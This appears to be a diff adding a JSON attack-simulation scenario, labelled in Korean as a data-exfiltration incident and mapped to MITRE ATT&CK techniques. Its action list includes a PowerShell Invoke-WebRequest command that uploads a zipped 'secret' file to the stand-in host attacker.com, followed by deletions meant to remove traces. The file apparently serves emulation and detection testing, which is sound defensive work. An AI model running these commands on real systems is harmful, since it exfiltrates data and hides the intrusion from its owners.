@@ -1,0 +1,71 @@
+{
+  "scenario_id": "case_attack_001",
+  "scenario_name": "explicit_data_exfiltration_attack",
+  "description": "민감 파일을 수집하고 압축 후 외부 서버로 전송하고 흔적을 삭제하는 침해 사고 시나리오",
+
+  "attack_mapping": [
+    {
+      "tactic": "Collection",
+      "technique_id": "T1005",
+      "technique_name": "Data from Local System"
+    },
+    {
+      "tactic": "Execution",
+      "technique_id": "T1059",
+      "technique_name": "Command and Scripting Interpreter"
+    },
+    {
+      "tactic": "Exfiltration",
+      "technique_id": "T1560",
+      "technique_name": "Archive Collected Data"
+    },
+    {
+      "tactic": "Exfiltration",
+      "technique_id": "T1041",
+      "technique_name": "Exfiltration Over Command Channel"
+    },
+    {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1070",
+      "technique_name": "Indicator Removal"
+    }
+  ],
+
+  "actions": [
+    {
+      "action_id": 1,
+      "action_type": "file_create",
+      "technique_id": "T1005",
+      "command": "echo secret_data > C:\\temp\\secret.txt",
+      "target": "C:\\temp\\secret.txt"
+    },
+    {
+      "action_id": 2,
+      "action_type": "file_compress",
+      "technique_id": "T1560",
+      "command": "Compress-Archive -Path C:\\temp\\secret.txt -DestinationPath C:\\temp\\secret.zip",
+      "target": "C:\\temp\\secret.zip"
+    },
+    {
+      "action_id": 3,
+      "action_type": "network_exfiltration",
+      "technique_id": "T1041",
+      "command": "powershell -Command \"Invoke-WebRequest -Uri http://attacker.com/upload -Method POST -InFile C:\\temp\\secret.zip\"",
+      "target": "http://attacker.com/upload"
+    },
+    {
+      "action_id": 4,
+      "action_type": "file_delete",
+      "technique_id": "T1070",
+      "command": "del C:\\temp\\secret.txt",
+      "target": "C:\\temp\\secret.txt"
+    },
+    {
+      "action_id": 5,
+      "action_type": "file_delete",
+      "technique_id": "T1070",
+      "command": "del C:\\temp\\secret.zip",
+      "target": "C:\\temp\\secret.zip"
+    }
+  ]
+}
